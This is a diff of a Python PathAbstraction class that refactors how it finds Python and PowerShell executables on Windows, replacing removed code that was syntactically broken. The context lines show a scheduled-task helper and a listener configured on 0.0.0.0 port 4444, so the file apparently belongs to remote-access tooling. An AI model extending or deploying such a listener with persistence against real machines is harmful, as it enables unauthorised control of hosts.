@@ -47,28 +47,59 @@ class PathAbstraction:
         # Try sys.executable first (most reliable for same-process calls)
         if hasattr(sys, 'frozen'):
             return sys.executable
-        # Fall back to environment variables
-        for var in ['PATHEXT', 'PATH']:
-            path = os.environ.get(var, '')
-            if path:
-                # Check if current executable is in PATH
-                current_exec = sys.executable
-                # If running from installed Python
-                if current_exec and 'python' in current_exec.lower():
-                    return current_exec
-        # Ultimate fallback: look in common locations
-        for common_py in [
-            'C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\Python{version}\\python.exe'.format(
-                user=os.environ.get('USERNAME', 'User'),
-                version='36', version='38', version='39', version='310', version='311', version='312'
+        
+        # Create list of common Python executable paths
+        current_user = os.environ.get('USERNAME', 'User')
+        current_version = '38'  # Default version
+        
+        # Build list of paths to check
+        python_paths = []
+        
+        # Check in current user's AppData directory
+        for ver in ['36', '38', '39', '310', '311', '312']:
+            path = os.path.join(
+                'C:\\Users\\{0}'.format(current_user),
+                'AppData\\Local\\Programs\\Python',
+                'Python{0}'.format(ver),
+                'python.exe'
             )
-            for _ in range(10)
-        ] + ['{0}\\python.exe'.format(os.environ.get('WINDIR', 'C:\\Windows'))]:
-            path = common_py.replace('{user}', os.environ.get('USERNAME', 'User'))
-            path = path.replace('{version}', '36', '38', '39', '310', '311', '312')
+            python_paths.append(path)
+        
+        # Check in Program Files
+        for ver in ['36', '38', '39', '310', '311', '312']:
+            path = os.path.join(
+                'C:\\Program Files\\Python{0}'.format(ver),
+                'python.exe'
+            )
+            python_paths.append(path)
+            
+            path64 = os.path.join(
+                'C:\\Program Files (x86)\\Python{0}'.format(ver),
+                'python.exe'
+            )
+            python_paths.append(path64)
+        
+        # Check in SystemRoot
+        system_root = os.environ.get('SystemRoot', 'C:\\Windows')
+        path = os.path.join(system_root, 'python.exe')
+        python_paths.append(path)
+        
+        # Check current working directory
+        current_dir = os.getcwd()
+        path = os.path.join(current_dir, 'python.exe')
+        python_paths.append(path)
+        
+        # Check if sys.executable exists (most likely)
+        if sys.executable:
+            python_paths.append(sys.executable)
+        
+        # Try each path until we find one
+        for path in python_paths:
             if os.path.exists(path):
                 return path
-        return sys.executable  # Ultimate fallback
+        
+        # Ultimate fallback
+        return sys.executable if sys.executable else 'python.exe'
     
     @staticmethod
     def get_schtasks_path():
@@ -95,15 +126,20 @@ class PathAbstraction:
         """Get PowerShell executable path."""
         # Try common locations using environment variables
         for windir in [os.environ.get('WINDIR', 'C:\\Windows'), os.environ.get('SystemRoot', 'C:\\Windows')]:
-            path = os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\powershell.exe')
-            if os.path.exists(path):
-                return path
-            path = os.path.join(windir, 'System32', 'powershell.exe')
-            if os.path.exists(path):
-                return path
-            path = os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\pwsh.exe')
-            if os.path.exists(path):
-                return path
+            paths = [
+                os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\powershell.exe'),
+                os.path.join(windir, 'System32', 'powershell.exe'),
+            ]
+            
+            for path in paths:
+                if os.path.exists(path):
+                    return path
+            paths2 = [
+                os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\pwsh.exe'),
+            ]
+            for path in paths2:
+                if os.path.exists(path):
+                    return path
         return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'powershell.exe')
     
     @staticmethod
@@ -162,7 +198,7 @@ class PathAbstraction:
         systemdrive = os.environ.get('SystemDrive', 'C:\\')
         windir = os.environ.get('WINDIR', 'C:\\Windows')
         return os.path.join(systemdrive, windir, os.path.basename(script_path)).replace('\\', '\\\\')
-
+                                                                                        
 # === CONFIGURATION ===
 LISTENER_HOST = "0.0.0.0"
 DEFAULT_PORT = 4444
